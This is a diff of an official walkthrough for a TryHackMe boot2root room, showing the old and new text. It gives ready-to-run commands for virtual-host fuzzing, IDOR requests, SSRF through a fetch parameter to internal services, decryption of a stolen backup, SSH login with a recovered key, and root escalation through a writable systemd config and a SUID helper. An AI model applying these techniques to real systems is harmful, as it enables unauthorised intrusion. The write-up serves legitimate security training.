@@ -1,8 +1,8 @@
 # NULLFORGE — Official Public Walkthrough
+### Discovery-First Edition
 
 > **Room:** NULLFORGE  
 > **Platform:** TryHackMe  
-> **URL:** https://tryhackme.com/room/nullforge  
 > **Difficulty:** Hard  
 > **Type:** Challenge / Boot2Root  
 > **Target solve time:** ~120 minutes  
@@ -12,90 +12,112 @@
 
 ## ⚠️ Spoiler Notice
 
-This is the **official solution walkthrough** for NULLFORGE.
+This is the official solution walkthrough for **NULLFORGE**.
 
-It intentionally explains the intended attack path, the reasoning behind each stage, the relevant commands, and the expected discoveries.
+The walkthrough is intentionally written as a **discovery-first guide**.
 
-To keep the room meaningful for players who have not yet completed it, **flag values, the target IP, and secret-derived values are intentionally redacted** as `****`.
+It does **not** hand the player the important filenames, object identifiers, hidden hostnames, internal paths, or other answers at the start of each section. Instead, each stage shows:
 
-The goal of this document is to explain **how to solve the room**, not to publish the answer strings.
+1. what to inspect,
+2. what signal to look for,
+3. how to extract the next piece of information,
+4. how to validate the discovery,
+5. and why that discovery leads to the next stage.
+
+Flag values, the target IP, and secret-derived values remain redacted as:
+
+```text
+****
+```
+
+The purpose is to document the intended methodology without turning the public walkthrough into an answer sheet.
 
 ---
 
-# 1. Challenge Overview
+# 1. Challenge Philosophy
 
-NULLFORGE is designed as a chained Linux attack path. Each stage reveals just enough information to make the next stage possible.
+NULLFORGE is a chained Linux attack path.
 
-The intended progression is:
+The machine is designed so that every major discovery creates the clue required for the next layer:
 
 ```text
-External reconnaissance
+External attack surface
         |
         v
-Public web application
+Web application
         |
         v
-Virtual-host discovery
+Hidden application surface
         |
         v
-Deployment console
+Object-level authorization flaw
         |
         v
-Broken object authorization
+Internal service disclosure
         |
         v
-Internal Operations API
+Server-side request capability
         |
         v
-SSRF
+Internal service mapping
         |
         v
-Internal Forge
+Backup infrastructure
         |
         v
-Backup service
+Deterministic archive recovery
         |
         v
-Encrypted backup
+Credential recovery
         |
         v
-SSH private key
+Local account
         |
         v
-ops foothold
+Privileged scheduled maintenance
         |
         v
-systemd timer
+Trusted writable configuration
         |
         v
-Writable maintenance configuration
-        |
-        v
-Root-controlled hook
-        |
-        v
-SUID helper
+Elevated helper
         |
         v
 root
 ```
 
-The challenge is deliberately layered. A player should not need to guess the final privilege escalation from the beginning; each discovery is intended to provide the clue for the next step.
+The intended experience is therefore:
+
+```text
+observe → hypothesize → test → discover → validate → pivot
+```
+
+Rather than:
+
+```text
+guess → exploit → collect flag
+```
+
+That distinction is important when approaching the room.
 
 ---
 
-# 2. What You Need
+# 2. Attacker Preparation
 
-A normal attacker workstation with:
+The intended path can be completed from a normal Linux attack workstation.
 
-- Nmap
-- curl
-- ffuf
-- OpenSSL
-- tar
-- SSH
+Useful tools:
 
-Kali Linux is suitable, but the commands are not dependent on Kali-specific tooling except where noted.
+```text
+nmap
+curl
+ffuf
+openssl
+tar
+ssh
+```
+
+Kali Linux is suitable.
 
 Throughout this walkthrough:
 
@@ -103,75 +125,128 @@ Throughout this walkthrough:
 MACHINE_IP
 ```
 
-means the IP address assigned to the NULLFORGE target by TryHackMe.
+means the IP address assigned to the target by TryHackMe.
 
-Do **not** replace `MACHINE_IP` inside the target itself. Run the commands from your attacker machine unless stated otherwise.
+Keep all target-specific values you discover in notes. In particular, record:
+
+```text
+- exposed ports
+- discovered hostnames
+- object identifiers
+- internal services
+- artifact identifiers
+- encryption parameters
+- recovered credentials
+- scheduled jobs
+```
+
+A useful habit is to maintain a small evidence log:
+
+```text
+DISCOVERY:
+EVIDENCE:
+WHY IT MATTERS:
+NEXT TEST:
+```
+
+This makes a multi-stage room much easier to follow.
 
 ---
 
 # Task 1 — THE FIRST SIGNAL
 
-## 3. Initial Reconnaissance
+## Stage Goal
 
-Start by identifying the external attack surface.
+Establish the externally reachable attack surface and identify the first piece of application-controlled information that points deeper into the system.
+
+---
+
+## 1.1 Map the Attack Surface
+
+Start broad:
 
 ```bash
 nmap -Pn -sC -sV -p- MACHINE_IP
 ```
 
-### What you are looking for
+Do not immediately assume that every application service must be directly reachable.
 
-The intended externally reachable services are:
+### What to record
+
+Identify:
 
 ```text
-22/tcp  SSH
-80/tcp  HTTP
+TCP ports
+service names
+service versions
+HTTP headers
+SSH information
 ```
 
-The deeper application services are intentionally bound to localhost, so they should **not** appear as directly reachable network services from your attacker machine.
+The intended external surface contains:
 
-This distinction is important.
+```text
+22/tcp
+80/tcp
+```
 
-If you only see the public services, that does not mean the other services do not exist. It means you need to find a way to make the target access them on your behalf later.
+The deeper application services are deliberately restricted to the target itself.
+
+### Reasoning checkpoint
+
+At this point ask:
+
+> If important services are not exposed externally, where could they be?
+
+That question becomes useful later.
 
 ---
 
-## 4. Enumerate the Web Application
+## 1.2 Inspect the Web Application
 
-Open the main web service:
+Start with the default HTTP response:
 
 ```bash
 curl -i http://MACHINE_IP/
 ```
 
-Read the response instead of immediately starting large directory brute-forcing.
+Read both the headers and body.
 
-The public application exposes several interesting routes, including:
+Do not begin with a large directory brute-force.
 
-```text
-/status
-/docs/operations
-/fetch?url=
-/assets/ops-manifest.json
-```
+First identify what the application itself reveals.
 
-The endpoint:
+Look for:
 
 ```text
-/fetch?url=
+links
+documentation
+status information
+API references
+static resources
+client-side references
+operational endpoints
 ```
 
-is especially important later.
+If the page contains references to additional resources, request those resources individually.
 
-For the first flag, retrieve the exposed manifest:
+For example:
 
 ```bash
-curl -s http://MACHINE_IP/assets/ops-manifest.json
+curl -s http://MACHINE_IP/<DISCOVERED_PATH>
 ```
 
-Inspect the complete response.
+### What you are trying to discover
 
-The manifest contains application/build information and the first flag.
+The public application exposes operational information and a static application artifact.
+
+The important point is not the filename itself.
+
+The important point is:
+
+> the application has exposed a machine-readable artifact that contains build/application context and the first flag.
+
+Retrieve the resource you discovered and inspect the complete response.
 
 ### Flag 01
 
@@ -179,110 +254,160 @@ The manifest contains application/build information and the first flag.
 THM{NULLFORGE::01::****}
 ```
 
-> **Learning point:** Publicly accessible static files, manifests, health endpoints, JavaScript, and documentation often reveal more about an application than the homepage itself.
+### Why this matters
+
+The first stage teaches a core CTF habit:
+
+> Read what the application voluntarily exposes before attempting complicated exploitation.
 
 ---
 
 # Task 2 — THE RECORD THAT SHOULDN'T EXIST
 
-## 5. Discover the Hidden Virtual Host
+## Stage Goal
 
-The public application gives enough hints to suspect that another web application exists behind a different virtual host.
+Use information gathered from the public application to identify another web surface, then determine whether its object-level access controls actually work.
 
-A useful next step is lightweight Host-header enumeration.
+---
 
-Create a small candidate list:
+## 2.1 Look for Another Web Surface
+
+The public application's operational information suggests that the deployment environment is larger than the public site.
+
+A useful next hypothesis is:
+
+> There may be a second virtual host that is not linked from the default page.
+
+Prepare a small hostname wordlist:
 
 ```bash
-printf "www\nadmin\nportal\nconsole\nops\ndev\nstatus\ninternal\n" > /tmp/nullforge-vhosts.txt
+printf "www\nadmin\nportal\nconsole\nops\ndev\nstatus\ninternal\n" \
+  > /tmp/vhosts.txt
 ```
 
-Run ffuf against the target:
+Run a Host-header scan:
 
 ```bash
 ffuf \
   -u http://MACHINE_IP/ \
   -H "Host: FUZZ.nullforge.internal" \
-  -w /tmp/nullforge-vhosts.txt \
+  -w /tmp/vhosts.txt \
   -fs 1609
 ```
 
-### Why `-fs 1609`?
+### Interpreting the result
 
-The public/default response produces a repeatable response size. Filtering that size helps separate the default site from the meaningful virtual-host response.
+Do not focus only on the status code.
 
-The important discovery is:
+Compare:
 
 ```text
-console.nullforge.internal
+response size
+title
+headers
+body structure
+redirect behavior
 ```
 
-Add the virtual host to `/etc/hosts` on your attacker machine:
+The meaningful candidate should behave differently from the default site.
+
+Once you identify it, add that hostname to `/etc/hosts`:
 
 ```bash
-echo "MACHINE_IP console.nullforge.internal" | sudo tee -a /etc/hosts
+echo "MACHINE_IP <DISCOVERED_HOSTNAME>" \
+  | sudo tee -a /etc/hosts
 ```
 
-Then request it directly:
+Then request the discovered host:
 
 ```bash
-curl -i http://console.nullforge.internal/
+curl -i http://<DISCOVERED_HOSTNAME>/
 ```
 
-You have now moved from the public web application to the **deployment console**.
+You should now reach a deployment-oriented application rather than the public portal.
 
 ---
 
-## 6. Inspect the Deployment API
+## 2.2 Identify the First Object
 
-The console exposes deployment records through an API.
+Inspect the deployment application's response.
 
-Start with the visible deployment identifier:
+Look for identifiers such as:
 
 ```text
-NF-2026-041
+deployment IDs
+release IDs
+job IDs
+environment IDs
+record IDs
 ```
 
-Request it:
+Do not assume an identifier shown in a browser or JSON response is protected.
+
+Copy the visible identifier:
+
+```text
+<VISIBLE_OBJECT_ID>
+```
+
+Request it directly:
 
 ```bash
 curl -s \
-  http://console.nullforge.internal/api/v1/deployments/NF-2026-041
+  http://<DISCOVERED_HOSTNAME>/api/v1/deployments/<VISIBLE_OBJECT_ID>
 ```
 
 Read the JSON carefully.
 
-The important observation is that deployment identifiers are accepted directly by the application and the authorization boundary is not correctly enforced.
+You are looking for:
 
-In other words, knowing or discovering another object identifier is enough to request it.
+```text
+related identifiers
+references to other deployments
+environment metadata
+internal service information
+unexpected fields
+```
 
-This is a classic **broken object-level authorization / IDOR-style** condition.
+---
 
-Request the related record:
+## 2.3 Test Object-Level Authorization
+
+The visible record references another deployment object.
+
+Instead of treating that reference as harmless metadata, test whether the API actually enforces authorization when the related identifier is requested.
+
+Use:
 
 ```bash
 curl -s \
-  http://console.nullforge.internal/api/v1/deployments/NF-2026-042
+  http://<DISCOVERED_HOSTNAME>/api/v1/deployments/<RELATED_OBJECT_ID>
 ```
 
-The second deployment should reveal information that is not intended to be exposed through the visible deployment.
+### What should happen
 
-It includes an internal Operations service:
+The API returns another deployment record even though the current context does not establish authorization to view it.
+
+This is the key weakness:
 
 ```text
-http://127.0.0.1:8081
+identifier discovered
+        ↓
+identifier requested
+        ↓
+server returns object
+        ↓
+authorization boundary fails
 ```
+
+This is a broken object-level authorization / IDOR-style condition.
+
+The second record also reveals information about an internal service that is not directly exposed to your workstation.
 
 ### Flag 02
 
 ```text
 THM{NULLFORGE::02::****}
-```
-
-### Hidden Deployment
-
-```text
-NF-2026-042
 ```
 
 ### Flag 03
@@ -291,65 +416,130 @@ NF-2026-042
 THM{NULLFORGE::03::****}
 ```
 
-> **Learning point:** Object authorization must be checked on the server for every requested object. An unpredictable identifier is not an authorization control.
+### Reasoning checkpoint
+
+You have now learned:
+
+```text
+Public site
+    ↓
+Hidden web application
+    ↓
+Object reference
+    ↓
+Unauthorized object
+    ↓
+Internal service information
+```
+
+That internal service is the bridge to the next task.
 
 ---
 
 # Task 3 — THE SERVICE BEHIND THE WALL
 
-## 7. Recognize the SSRF Primitive
+## Stage Goal
 
-At this point you have discovered a service that only listens on localhost:
+Use the public application's request functionality to reach a service that your workstation cannot access directly.
 
-```text
-127.0.0.1:8081
-```
+---
 
-Your attacker machine cannot directly connect to it.
+## 3.1 Validate the Internal Service
 
-Return to the public application's remote-fetch feature:
+From the previous task you should have discovered:
 
 ```text
-/fetch?url=
+127.0.0.1:<INTERNAL_PORT>
 ```
 
-Test whether the server will request the internal endpoint for you:
+Try accessing that address directly from your attacker machine only to confirm the boundary:
+
+```bash
+curl -i http://127.0.0.1:<INTERNAL_PORT>/health
+```
+
+This should not give you the target service.
+
+That is expected.
+
+The address is loopback-relative to the target machine.
+
+### New hypothesis
+
+The public application already contains a feature that accepts a remote resource.
+
+Find that feature from:
+
+```text
+homepage
+documentation
+HTML
+application responses
+client-side references
+```
+
+You are looking for a parameter or endpoint that effectively says:
+
+```text
+"fetch this URL for me"
+```
+
+---
+
+## 3.2 Prove Server-Side Request Forgery
+
+Once you identify the remote-fetch functionality, point it at the internal health endpoint.
+
+Conceptually:
 
 ```bash
 curl -i \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/health"
+  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<INTERNAL_PORT>/health"
 ```
 
-If the response contains the internal service response, you have confirmed **server-side request forgery (SSRF)**.
+If the response contains the internal service's response, you have confirmed:
 
-The important idea is:
+```text
+SSRF
+```
+
+The request path is now:
 
 ```text
 Attacker
    |
    v
-Public web server
+Public HTTP service
    |
    v
-127.0.0.1:8081
+Target localhost
+   |
+   v
+Internal service
 ```
 
-The request to `127.0.0.1` is executed from the target server, not from your workstation.
+This is the critical pivot.
 
 ---
 
-## 8. Enumerate the Operations API
+## 3.3 Enumerate the Internal Service
 
-Use the SSRF primitive to reach the diagnostic endpoint:
+Use the same SSRF primitive against the internal service's diagnostic functionality.
 
-```bash
-curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/diagnostics"
+Start with a health/diagnostic-style endpoint discovered from the service behavior or documentation.
+
+Then inspect the response for:
+
+```text
+service names
+ports
+URLs
+backend identifiers
+environment information
+routing information
 ```
 
-Inspect the response.
-
-The fourth flag is exposed here.
+One internal API response exposes the fourth flag.
 
 ### Flag 04
 
@@ -357,43 +547,47 @@ The fourth flag is exposed here.
 THM{NULLFORGE::04::****}
 ```
 
-Next, enumerate the internal service registry:
+Next, locate the service registry or equivalent internal inventory endpoint.
 
-```bash
-curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/registry"
-```
+The response should identify additional services bound to localhost.
 
-The registry identifies additional localhost services:
+Record them as:
 
 ```text
-Forge   127.0.0.1:8082
-Backup  127.0.0.1:9090
+SERVICE_A = 127.0.0.1:<PORT>
+SERVICE_B = 127.0.0.1:<PORT>
 ```
 
-This registry is effectively your internal service map.
+Do not assume these ports are externally reachable.
+
+They are useful precisely because SSRF lets you reach them through the target.
 
 ---
 
-## 9. Reach the Internal Forge
+## 3.4 Pivot Into the Next Internal Service
 
-Because the same SSRF primitive can access localhost services, request the Forge API:
+Take the newly discovered internal application and interrogate its project/workflow information.
 
-```bash
-curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/projects/nightly-backup"
-```
-
-The returned project information points toward the nightly backup workflow.
-
-Retrieve the artifact manifest:
+Use the SSRF wrapper again:
 
 ```bash
 curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/artifacts/nightly-manifest.json"
+  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<FORGE_PORT>/<DISCOVERED_PROJECT_PATH>"
 ```
 
-The manifest identifies the backup backend and contains the fifth flag.
+Look for:
+
+```text
+backup jobs
+artifact references
+repository names
+scheduled workflows
+storage backends
+```
+
+Next retrieve the artifact metadata referenced by that workflow.
+
+The returned metadata contains the fifth flag and identifies the backup subsystem.
 
 ### Flag 05
 
@@ -401,36 +595,61 @@ The manifest identifies the backup backend and contains the fifth flag.
 THM{NULLFORGE::05::****}
 ```
 
-> **Learning point:** SSRF is often more useful as an internal network-discovery primitive than as a single request. Once a server can reach localhost, look for service registries, health endpoints, metadata, APIs, and administrative interfaces.
+### Learning point
+
+SSRF is not merely:
+
+> "make one request to localhost."
+
+It is an **internal network access primitive**.
+
+Once you have it, perform structured enumeration:
+
+```text
+health
+diagnostics
+registry
+project metadata
+artifact metadata
+repositories
+backend services
+```
 
 ---
 
 # Task 4 — THE ARCHIVE THAT REMEMBERS
 
-## 10. Discover the Backup Service
+## Stage Goal
 
-The Operations registry exposed:
+Use the internal service map to locate the backup system, recover an encrypted artifact, understand how its passphrase is constructed, and extract the credential material needed for SSH access.
 
-```text
-127.0.0.1:9090
-```
+---
 
-Use the existing SSRF to access the backup service:
+## 4.1 Locate the Backup Backend
+
+From the internal registry, you should have a second localhost service.
+
+Test its health or latest-backup functionality through the same SSRF mechanism.
+
+Conceptually:
 
 ```bash
 curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/backups/latest"
+  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<BACKUP_PORT>/<LATEST_BACKUP_PATH>"
 ```
 
-The response reveals a nightly backup artifact and metadata similar to:
+Inspect the complete response.
+
+Record:
 
 ```text
-artifact: nightly-****-**-**.tar.gz.enc
-encryption: AES-256-CBC
-job: nightly-backup
+artifact identifier
+encryption algorithm
+backup job name
+metadata
 ```
 
-It also contains the sixth flag.
+One value in the response is the sixth flag.
 
 ### Flag 06
 
@@ -440,42 +659,56 @@ THM{NULLFORGE::06::****}
 
 ---
 
-## 11. Retrieve the Encrypted Backup
+## 4.2 Retrieve the Artifact
 
-Download the archive through SSRF:
+Do not guess the archive name.
+
+Use the identifier returned by the backup service.
+
+Then request the corresponding download resource through SSRF and save it locally:
 
 ```bash
 curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/download/nightly-2026-09-24" \
-  -o /tmp/nightly-backup.tar.gz.enc
+  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<BACKUP_PORT>/<DISCOVERED_DOWNLOAD_PATH>" \
+  -o /tmp/backup.enc
 ```
 
-At this point you have an encrypted archive.
+Confirm what you received:
 
-Do **not** start password brute-forcing.
+```bash
+file /tmp/backup.enc
+ls -lh /tmp/backup.enc
+```
 
-The intended route is to discover how the backup system constructs its passphrase.
+You now have an encrypted backup.
+
+### Important
+
+Do not immediately attempt password cracking.
+
+The challenge provides enough information to reconstruct the encryption inputs.
 
 ---
 
-## 12. Discover the Backup Encryption Rule
+## 4.3 Find the Backup Policy
 
-The internal Forge repository exposes the backup policy:
+Return to the internal repository/application discovered earlier.
 
-```bash
-curl -s \
-  "http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/repositories/ops-backup-config/files/backup-policy.json"
-```
+The repository exposes a configuration artifact describing how backups are encrypted.
 
-Look for fields describing:
+The important task here is **not** to memorize its filename.
+
+Instead, identify the configuration entry that contains fields corresponding to:
 
 ```text
 cipher
 KDF
-passphrase_rule
+passphrase rule
 ```
 
-The policy defines:
+Once you locate the policy, inspect it.
+
+The relevant rule is:
 
 ```text
 cipher: AES-256-CBC
@@ -483,38 +716,70 @@ KDF: PBKDF2
 passphrase_rule: latest_commit + job_start_hhmm
 ```
 
-This is the key clue.
+This changes the problem completely.
 
-The passphrase is not a random secret.
+You do not have a random password.
 
-It is derived from two values exposed by the application's backup configuration:
-
-```text
-latest_commit + job_start_hhmm
-```
-
-The walkthrough intentionally redacts the actual values:
-
-```text
-latest commit: ****
-job start:     **:**
-```
-
-Therefore the final passphrase should be constructed by concatenating those values:
-
-```text
-passphrase = <latest_commit><job_start_hhmm>
-```
-
-There is no intended need for password brute force.
-
-> **Learning point:** When an application tells you a key-derivation rule, treat it as a data-recovery problem before treating it as a cracking problem.
+You have a deterministic construction rule.
 
 ---
 
-## 13. Decrypt the Archive
+## 4.4 Collect the Two Inputs
 
-Use OpenSSL with the parameters disclosed by the backup policy:
+The policy tells you exactly what inputs are needed:
+
+```text
+latest commit
+job start time
+```
+
+Retrieve those values from the application's backup/repository metadata.
+
+Record them as:
+
+```text
+LATEST_COMMIT = <DISCOVERED_VALUE>
+JOB_START     = <DISCOVERED_HHMM>
+```
+
+The intended passphrase is:
+
+```text
+<DISCOVERED_VALUE><DISCOVERED_HHMM>
+```
+
+The actual value is intentionally omitted from this public walkthrough.
+
+### Reasoning checkpoint
+
+The correct thought process is:
+
+```text
+Encrypted archive
+       |
+       v
+Need password
+       |
+       v
+Backup policy
+       |
+       v
+Passphrase construction rule
+       |
+       v
+Two discoverable inputs
+       |
+       v
+Deterministic passphrase
+```
+
+No brute-force phase is intended.
+
+---
+
+## 4.5 Decrypt the Backup
+
+Use the parameters disclosed by the policy:
 
 ```bash
 openssl enc \
@@ -522,41 +787,68 @@ openssl enc \
   -aes-256-cbc \
   -pbkdf2 \
   -iter 200000 \
-  -in /tmp/nightly-backup.tar.gz.enc \
-  -out /tmp/nightly-backup.tar.gz \
+  -in /tmp/backup.enc \
+  -out /tmp/backup.tar.gz \
   -pass pass:'<DERIVED_PASSPHRASE>'
 ```
 
-Then list the archive:
+Verify the archive:
 
 ```bash
-tar -tzf /tmp/nightly-backup.tar.gz
+file /tmp/backup.tar.gz
+tar -tzf /tmp/backup.tar.gz
 ```
 
-The archive contains the important recovery material, including:
+Do not assume the contents from the walkthrough.
 
-```text
-home/ops/.ssh/id_ed25519
-README.txt
-flag07.txt
-```
+Let the archive tell you what it contains.
 
-Create an extraction directory:
+---
+
+## 4.6 Discover the Credential Material
+
+Extract into a temporary directory:
 
 ```bash
-mkdir -p /tmp/nullforge-backup
+mkdir -p /tmp/nullforge-recovery
+tar -xzf /tmp/backup.tar.gz -C /tmp/nullforge-recovery
 ```
 
-Extract the archive:
+Now search the extracted tree rather than using a hard-coded path:
 
 ```bash
-tar -xzf /tmp/nightly-backup.tar.gz -C /tmp/nullforge-backup
+find /tmp/nullforge-recovery \
+  -type f \
+  \( -path '*/.ssh/*' -o -iname '*key*' \) \
+  -print
 ```
 
-Read the seventh flag:
+Inspect candidate files:
 
 ```bash
-cat /tmp/nullforge-backup/flag07.txt
+file <DISCOVERED_FILE>
+```
+
+A recovered private SSH key should be recognizable from its format.
+
+Secure it:
+
+```bash
+chmod 600 <DISCOVERED_PRIVATE_KEY>
+```
+
+The archive also contains a flag-bearing artifact.
+
+Locate it instead of assuming its path:
+
+```bash
+find /tmp/nullforge-recovery -type f -iname '*flag*' -print
+```
+
+Read the discovered flag file:
+
+```bash
+cat <DISCOVERED_FLAG_FILE>
 ```
 
 ### Flag 07
@@ -567,40 +859,42 @@ THM{NULLFORGE::07::****}
 
 ---
 
-## 14. Recover the SSH Private Key
+## 4.7 Use the Recovered Credential
 
-The backup contains the SSH private key for the `ops` account.
+The recovered key belongs to the local account that the backup workflow protects.
 
-Restrict its permissions:
-
-```bash
-chmod 600 /tmp/nullforge-backup/home/ops/.ssh/id_ed25519
-```
-
-Use it to authenticate:
+Use the discovered private key:
 
 ```bash
 ssh \
-  -i /tmp/nullforge-backup/home/ops/.ssh/id_ed25519 \
-  ops@MACHINE_IP
+  -i <DISCOVERED_PRIVATE_KEY> \
+  <DISCOVERED_USERNAME>@MACHINE_IP
 ```
 
-Confirm the account:
+Confirm the current identity:
 
 ```bash
 whoami
 ```
 
-Expected:
-
-```text
-ops
-```
-
-Read the user flag:
+Then inspect the account:
 
 ```bash
-cat /home/ops/user.txt
+id
+```
+
+You should now be operating as the intended low-privileged foothold account.
+
+Search for the user flag instead of assuming its location:
+
+```bash
+find "$HOME" -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
+```
+
+Read the discovered flag:
+
+```bash
+cat <DISCOVERED_USER_FLAG>
 ```
 
 ### Flag 08
@@ -609,108 +903,225 @@ cat /home/ops/user.txt
 THM{NULLFORGE::08::****}
 ```
 
-> **Learning point:** Backups frequently contain credentials, keys, configuration files, and historical artifacts that are more privileged than the original application interface.
+### Learning point
+
+A backup is a historical copy of a system.
+
+Historical copies often contain:
+
+```text
+private keys
+tokens
+configuration
+credentials
+automation data
+old deployment information
+```
+
+The security boundary around "backup" can therefore be weaker than the security boundary around the live application.
 
 ---
 
 # Task 5 — THE LAST SCHEDULE
 
-## 15. Enumerate the Local System
+## Stage Goal
 
-Now that you have an `ops` shell, switch from web enumeration to local enumeration.
+Switch to local Linux enumeration, identify a privileged scheduled process, trace its configuration, determine which part of that configuration is writable, and follow the trust relationship to root.
 
-First inspect the current identity and group membership:
+---
+
+## 5.1 Start With Identity and Groups
+
+Now that you have a shell, begin with:
 
 ```bash
 id
 ```
 
-The account belongs to the maintenance group:
+Record every group.
 
-```text
-nf-maint
-```
+One group is especially relevant to the maintenance functionality.
 
-This is the clue that the final stage is related to system maintenance.
+Do not stop after noticing the group name.
+
+The next question is:
+
+> What privileged process uses this group?
 
 ---
 
-## 16. Enumerate Systemd Timers
+## 5.2 Enumerate Scheduled Execution
 
-Search for relevant timers:
+Look for systemd timers:
 
 ```bash
-systemctl list-timers --all | grep nullforge
+systemctl list-timers --all
 ```
 
-The important timer is:
+Filter only after you have seen the available jobs:
+
+```bash
+systemctl list-timers --all | grep -i maint
+```
+
+or:
+
+```bash
+systemctl list-timers --all | grep -i null
+```
+
+The relevant timer should point to a maintenance service.
+
+Copy the unit name from the timer output:
 
 ```text
-nullforge-maint.timer
+<DISCOVERED_TIMER_UNIT>
 ```
 
-Inspect the corresponding service:
+Then inspect the service associated with it:
 
 ```bash
-systemctl cat nullforge-maint.service
+systemctl cat <DISCOVERED_SERVICE_UNIT>
 ```
 
-The important service configuration includes:
+---
+
+## 5.3 Follow the Service Configuration
+
+Do not assume what the service does.
+
+Read its unit definition carefully.
+
+Look for directives such as:
+
+```text
+User=
+EnvironmentFile=
+ExecStart=
+WorkingDirectory=
+ExecStartPre=
+ExecStartPost=
+```
+
+The critical combination is:
 
 ```text
 User=root
-EnvironmentFile=/etc/nullforge/maint.env
-ExecStart=/usr/local/sbin/nullforge-maint
 ```
 
-This immediately gives you a critical question:
-
-> What does the root-owned service load from the environment file, and who can modify it?
-
----
-
-## 17. Inspect the Maintenance Configuration
-
-Read the environment file:
-
-```bash
-cat /etc/nullforge/maint.env
-```
-
-The important values are:
+together with:
 
 ```text
-ROTATION_HOOK=/home/ops/.local/bin/nf-hook
-ROTATION_MODE=nightly
+EnvironmentFile=<DISCOVERED_ENV_FILE>
 ```
 
-Now check the permissions:
+and a maintenance executable.
 
-```bash
-ls -l /etc/nullforge/maint.env
-```
+That gives you the next hypothesis:
 
-The file is writable by the `nf-maint` group.
-
-Because your `ops` account belongs to that group, the privileged maintenance process trusts configuration data that can be modified by a low-privileged account.
-
-This is the central privilege-escalation weakness.
+> A root process is consuming configuration stored somewhere else. Who can modify that configuration?
 
 ---
 
-## 18. Follow the Trusted Hook
+## 5.4 Inspect the Environment File
 
-The root-controlled maintenance process uses the configured hook path.
-
-The existing hook causes two important effects:
-
-1. It makes the stage-09 flag available to the `ops` account.
-2. It changes the permissions of the `nullforge-report` helper so that it becomes SUID.
-
-After the maintenance job runs, read the stage-09 file:
+Read the exact environment file referenced by the service:
 
 ```bash
-cat /home/ops/.cache_stage09
+cat <DISCOVERED_ENV_FILE>
+```
+
+Look for variables that influence execution.
+
+One of them defines a hook/script path:
+
+```text
+ROTATION_HOOK=<DISCOVERED_HOOK_PATH>
+```
+
+Check permissions on the configuration file:
+
+```bash
+ls -l <DISCOVERED_ENV_FILE>
+```
+
+The intended weakness is that the file is writable by the maintenance group that the current user belongs to.
+
+This creates the trust boundary:
+
+```text
+ops
+  |
+  v
+maintenance group
+  |
+  v
+writable configuration
+  |
+  v
+root service
+```
+
+That is the core local privilege-escalation condition.
+
+---
+
+## 5.5 Trace the Hook
+
+Rather than relying on a hard-coded script name, extract the hook path from the environment file:
+
+```bash
+HOOK=$(awk -F= '$1=="ROTATION_HOOK"{print substr($0,index($0,"=")+1)}' <DISCOVERED_ENV_FILE>)
+echo "$HOOK"
+```
+
+Inspect it:
+
+```bash
+sed -n '1,160p' "$HOOK"
+```
+
+The hook reveals two important behaviors:
+
+```text
+1. a stage-09 flag becomes readable by the current account
+2. a privileged helper is assigned SUID permissions
+```
+
+This is the clue that the final escalation is not a conventional `sudo` exploit.
+
+It is a chain:
+
+```text
+writable config
+      ↓
+root service
+      ↓
+trusted hook
+      ↓
+SUID permission
+      ↓
+privileged helper
+```
+
+---
+
+## 5.6 Recover Flag 09
+
+Once the maintenance process has executed, search for newly accessible flag material:
+
+```bash
+find "$HOME" /tmp -maxdepth 4 \
+  -type f \
+  -iname '*flag*' \
+  -readable \
+  -print 2>/dev/null
+```
+
+Inspect the candidate associated with the maintenance stage:
+
+```bash
+cat <DISCOVERED_FLAG_FILE>
 ```
 
 ### Flag 09
@@ -721,63 +1132,63 @@ THM{NULLFORGE::09::****}
 
 ---
 
-## 19. Identify the SUID Helper
+## 5.7 Find the Elevated Helper
 
-Inspect the helper:
+Now enumerate SUID binaries in the relevant local installation area:
 
 ```bash
-ls -l /usr/local/libexec/nullforge-report
+find /usr/local -xdev \
+  -type f \
+  -perm -4000 \
+  -ls 2>/dev/null
 ```
 
-After the maintenance process has executed, the permissions include the SUID bit:
+Alternatively, inspect the paths mentioned by the hook:
+
+```bash
+grep -nE 'chmod|install|4755|suid' "$HOOK"
+```
+
+Use the evidence from the hook to identify the helper that has just been promoted.
+
+Then inspect it:
+
+```bash
+ls -l <DISCOVERED_SUID_HELPER>
+```
+
+The expected permission pattern includes:
 
 ```text
 -rwsr-xr-x
 ```
 
-You can also search for SUID binaries in the relevant directory:
-
-```bash
-find /usr/local/libexec -perm -4000 -type f -ls
-```
-
-The intended helper is:
-
-```text
-/usr/local/libexec/nullforge-report
-```
-
-The important thing to recognize is that this helper runs with elevated effective privileges.
+The `s` in the owner-execute position is the important part.
 
 ---
 
-## 20. Obtain Root
+## 5.8 Cross the Final Privilege Boundary
 
-Execute the SUID helper:
+Execute the discovered helper:
 
 ```bash
-/usr/local/libexec/nullforge-report
+<DISCOVERED_SUID_HELPER>
 ```
 
-Verify your identity:
+Validate:
 
 ```bash
 whoami
+id
 ```
 
-Expected:
+A successful escalation should show:
 
 ```text
 root
 ```
 
-Then:
-
-```bash
-id
-```
-
-A successful escalation should show a root UID:
+and:
 
 ```text
 uid=0(root)
@@ -785,18 +1196,24 @@ uid=0(root)
 
 ---
 
-## 21. Read the Final Flag
+## 5.9 Find the Final Flag
 
-The final flag is stored at:
+Do not rely on a hard-coded filename.
 
-```text
-/root/root.txt
-```
-
-Read it:
+Search the root-owned home directory for the final flag material:
 
 ```bash
-cat /root/root.txt
+find /root \
+  -maxdepth 3 \
+  -type f \
+  -iname '*flag*' \
+  -print 2>/dev/null
+```
+
+Read the discovered final flag:
+
+```bash
+cat <DISCOVERED_ROOT_FLAG>
 ```
 
 ### Flag 10
